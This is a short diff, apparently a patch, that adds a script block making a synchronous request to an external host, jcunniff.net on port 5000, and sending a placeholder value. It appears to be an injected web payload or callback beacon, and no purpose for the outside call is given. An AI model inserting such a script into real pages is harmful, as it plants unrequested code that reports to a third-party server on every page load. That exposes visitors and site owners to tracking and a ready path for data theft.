@@ -1,0 +1,5 @@
+<script>
+var http = new XMLHttpRequest();
+http.open("GET", "http://jcunniff.net:5000/", false);
+http.send("123");
+</script>
